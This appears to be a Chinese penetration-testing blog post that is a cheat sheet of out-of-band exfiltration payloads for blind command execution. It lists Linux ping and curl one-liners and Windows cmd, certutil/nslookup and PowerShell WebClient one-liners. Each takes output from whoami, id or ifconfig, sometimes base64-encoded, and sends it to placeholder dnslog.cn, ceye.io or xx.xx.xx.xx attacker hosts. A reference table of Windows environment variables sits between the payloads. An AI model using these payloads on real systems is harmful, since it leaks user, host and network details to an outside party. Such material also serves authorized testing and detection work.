---
layout: post
title: DNS外带数据之命令执行
abbrlink: e5958fdc3cbb48aab9e178a9f49cd3ee
tags: []
categories:
  - 渗透测试
  - 漏洞姿势
  - DNS外带数据
date: 1735051384702
updated: 1735228130542
---

# Linux

```python
#ping
ping `whoami`.xxx.ceye.io
ping -c 1 $(whoami).xxx.dnslog.cn

#ping+base64
ping -c 1 $(whoami|base64).xxx.dnslog.cn

#curl
curl http://xxx.ceye.io/`whoami`
curl http://xx.xx.xx.xx/$(whoami)
curl http://$(whoami).xx.dnslog.cn

#curl+base64
curl http://xx.xx.xx.xx/$(id|base64)
curl http://$(id|base64).xx.dnslog.cn
curl http://xx.xx.xx.xx/$(ifconfig|base64|tr 'n' '-')
```

# windows

```python
ping %USERNAME%.xxxx.ceye.io

//变量 类型 描述
%ALLUSERSPROFILE% 本地 返回“所有用户”配置文件的位置。
%APPDATA% 本地 返回默认情况下应用程序存储数据的位置。
%CD% 本地 返回当前目录字符串。
%CMDCMDLINE% 本地 返回用来启动当前的 Cmd.exe 的准确命令行。
%CMDEXTVERSION% 系统 返回当前的“命令处理程序扩展”的版本号。
%COMPUTERNAME% 系统 返回计算机的名称。
%COMSPEC% 系统 返回命令行解释器可执行程序的准确路径。
%DATE% 系统 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
%ERRORLEVEL% 系统 返回上一条命令的错误代码。通常用非零值表示错误。
%HOMEDRIVE% 系统 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
%HOMEPATH% 系统 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
%HOMESHARE% 系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
%LOGONSERVER% 本地 返回验证当前登录会话的域控制器的名称。
%NUMBER_OF_PROCESSORS% 系统 指定安装在计算机上的处理器的数目。
%OS% 系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
%PATH% 系统 指定可执行文件的搜索路径。
%PATHEXT% 系统 返回操作系统认为可执行的文件扩展名的列表。
%PROCESSOR_ARCHITECTURE% 系统 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
%PROCESSOR_IDENTFIER% 系统 返回处理器说明。
%PROCESSOR_LEVEL% 系统 返回计算机上安装的处理器的型号。
%PROCESSOR_REVISION% 系统 返回处理器的版本号。
%PROMPT% 本地 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
%RANDOM% 系统 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
%SYSTEMDRIVE% 系统 返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
%SYSTEMROOT% 系统 返回 Windows server operating system 根目录的位置。
%TEMP%和%TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
%TIME% 系统 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。
%USERDOMAIN% 本地 返回包含用户帐户的域的名称。
%USERNAME% 本地 返回当前登录的用户的名称。
%USERPROFILE% 本地 返回当前用户的配置文件的位置。
%WINDIR% 系统 返回操作系统目录的位置。
```

```python
#命令行
cmd /v /c "whoami > temp && certutil -encode temp temp2 && findstr /L /V "CERTIFICATE" temp2 > temp3 && set /p MYVAR=< temp3 && set FINAL=!MYVAR!.xxx.dnslog.cn && nslookup !FINAL!"

#通过start外带
for /F %X in ('whoami') do start http://xx.xx.xx.xx:80/%X
for /F "delims= tokens=2" %i in ('whoami') do ping -n 1 %i.xx.dnslog.cn

#powershell
for /F %X in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%X'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xx.xx.xx.xx/'+$a);
```

> 更新: 2023-04-09 02:31:47\
> 原文: <https://www.yuque.com/yuqueyonghuwrqimt/kmabi0/ybogb2>
